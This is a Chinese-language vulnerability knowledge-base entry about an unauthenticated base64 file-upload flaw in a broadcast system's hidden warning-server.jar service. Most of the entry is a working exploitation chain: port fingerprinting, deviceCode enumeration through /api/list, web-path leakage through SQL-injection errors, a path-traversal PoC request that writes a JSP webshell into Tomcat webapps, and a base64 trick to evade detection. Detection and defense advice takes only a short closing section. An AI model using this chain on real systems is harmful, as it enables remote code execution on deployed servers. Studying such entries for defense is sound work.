---
id: web-generic-file-upload-faith-warning-server-savefile-base64-drive-traversal
title: 某广播系统隐藏 jar 服务（独立端口 RESTEasy /api/saveFile）base64 任意文件上传：deviceCode 须有效可经 /api/list 获取、fileName 相对 E:\fileDir 穿越到 Tomcat webapps
type: scenario
domain: web
path: web/generic/file-upload
technique: hidden-jar-service-base64-upload-traversal
tags:
- file-upload
- java
- resteasy
- path-traversal
- webshell
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-23
  verified_at: '2026-11-08T13:48:13+08:00'
  notes: '已对照原文核对：saveFile 四参数（fileStr/fileName/deviceCode/content）、CommApiService.alarm 前置校验须有效 deviceCode、BASE64Decoder 解码、sPath 写死 E:////fileDir 后 FileOutputStream(sPath+/+fileName) 无过滤，均与图 52 一致；/api/list?roleId=1 获取 deviceCode（图 53-56）、注入报错泄露 E 盘 Tomcat webapps 路径（图 57）、穿越上传 1.jsp 成功访问（图 58-59）证据链完整。RESTEasy 表述与图 49 @Path 注解及 Server: RESTFUL SERVER 3.0.1 响应头相容。未验证点：真实环境复现。'
url: /docs/web/generic/file-upload/web-generic-file-upload-faith-warning-server-savefile-base64-drive-traversal/
draft: false
kb_aliases:
- warning-server saveFile 任意上传
- 隐藏 jar 接口 getshell
- fourfaith 广播系统上传
- base64 文件内容上传
---

# 某广播系统隐藏 jar 服务（独立端口 RESTEasy /api/saveFile）base64 任意文件上传：deviceCode 须有效可经 /api/list 获取、fileName 相对 E:\fileDir 穿越到 Tomcat webapps

## 一句话结论

某广播系统部署包除 Tomcat web 目录外还有一个部署时需启动的 `warning-server.jar`（RESTEasy 服务，独立端口，GET / 返回两个 `HTTP/1.1 100 Continue` 可识别），其 `/api/saveFile` 接口把 base64 解码后的 fileStr 直接 `FileOutputStream("E:\\fileDir\\" + fileName)` 写盘，fileName 可 `../` 穿越（Windows 下仅限同盘），前置条件是 deviceCode 必须为系统已存在设备（可经无鉴权 `/api/list?roleId=1` 枚举），配合后台 SQL 注入报错泄露的 web 路径，把 jsp 写进 `E:\...\apache-tomcat-8.5.50\webapps\ROOT\1.jsp`，实测 `GET /1.jsp` 返回 200 完成 RCE。

## 原理

- 入口隐藏：web 目录代码无 getshell 点，但部署包 server/ 目录的 warning-server.jar 按说明文档与 conf 配置随服务启动，占用与 web 不同的端口；jar 内 AppApi/CommApi/ConfApi/Mp3PayApi/UpgradeApi 等类以 `@Path` 声明 RESTEasy 路由（如 @Path("/login")、/list、/saveFile），端口探测特征是对根路径 GET 返回两个 100 Continue。
- 任意上传：saveFile 取 fileStr/fileName/deviceCode/content 四参数；先调 `CommApiService.alarm(map)`——deviceCode 不存在时报警流程异常中断，因此必须传入有效设备码；随后 `fileStr.replaceAll(" ","+")` 做 base64 解码（sPath 写死 `E:\\fileDir\\`，目录不存在会 mkdirs），最后 `new FileOutputStream(sPath + "/" + fileName)` 写出，fileName 无任何过滤。
- 约束与破解：Windows `..` 不能跨盘符，故只能在 E 盘内移动，但 sPath 是相对拼接的绝对路径，`fileName=../../<相对 web 路径>/1.jsp` 即可落到 Tomcat webapps；web 绝对路径可从后台 SQL 注入的报错信息（MySQL SQLException 回显 mapper 文件物理路径）直接拿到。deviceCode 经 `/api/list?roleId=1`（mapper 中 selectCount 只要 roleId 即可查询）返回的设备列表获取。
- 内容 base64 编码既绕过明文 jsp 检测也无需 multipart，application/x-www-form-urlencoded 即可提交。

## 触发条件

- 目标部署了该广播系统（fourfaith warning-server，server/warning-server.jar 随部署启动）；
- jar 服务端口对外开放且 /api/saveFile 无鉴权；
- 系统安装在 E 盘（sPath 写死 E:\fileDir，跨盘不可行，其他盘部署时此链不可用）；
- 需要有效 deviceCode（/api/list 可无鉴权枚举）与 web 绝对路径（注入报错或默认部署路径猜测）。

## 利用步骤

1. 识别 jar 服务端口：对非常见端口 GET /，响应为两个 `HTTP/1.1 100 Continue`；`GET /api/login` 返回 JSON（如 {"msg":"用户不存在,登录失败"}）确认路由存在。
2. `GET /api/list?roleId=1` 从返回设备列表取一个 deviceCode。
3. 通过后台注入报错（如 /roleInfo/findRoleInfo.do 中 rows/page 参数注入）拿到形如 `E:\...\apache-tomcat-8.5.50\webapps\ROOT\WEB-INF\classes\...` 的物理路径。
4. `POST /api/saveFile`（application/x-www-form-urlencoded）：fileStr=jsp webshell 的 base64、fileName=`../..//apache-tomcat-8.5.50/webapps/ROOT/1.jsp`（相对 E:\fileDir 穿越）、deviceCode=上一步取值、content 任意；返回 {"msg":"预警成功","code":"200"}。
5. `GET /1.jsp` 验证执行。

## PoC

```http
POST /api/saveFile HTTP/1.1
Host: <jar端口>
Content-Type: application/x-www-form-urlencoded

fileStr=PG89JT...（jsp 内容 base64）&fileName=../..//apache-tomcat-8.5.50/webapps/ROOT/1.jsp&content=1&deviceCode=<有效设备码>
```

原文实测：返回 code 200 后 `GET /1.jsp` 200 且输出 jsp 执行内容。

## 变体与关联

- 变体：同类「web 打不动就审部署包里附带的其他服务进程」思路适用于 server/、service/、bin/ 下随部署启动的 jar/exe；端口识别特征（非常规协议响应）先行指纹化。
- 变体：fileName 拼接型落盘（sPath + "/" + fileName）均可用 ../ 穿越；Windows 限制为同盘，Linux 无此限制。
- 关联：[[web-generic-file-upload-cmsv6-inspect-file-upload-folder-traversal]]（同为目录穿越+无校验落盘的接口上传）。
- 关联：[[web-generic-file-upload-empty-filename-path-concat-bypass]]（同为多环节配合的上传链）。

## 检测与防御

- 检测：/api/saveFile 的调用与 base64 大包体；fileDir 目录外新增文件；非常规端口的 HTTP 服务暴露。
- 防御：jar 服务绑定内网/防火墙隔离；saveFile 鉴权并对 fileName 做 basename 化+白名单目录；deviceCode 校验与 alarm 解耦；禁用 E:\fileDir 之外的写权限。
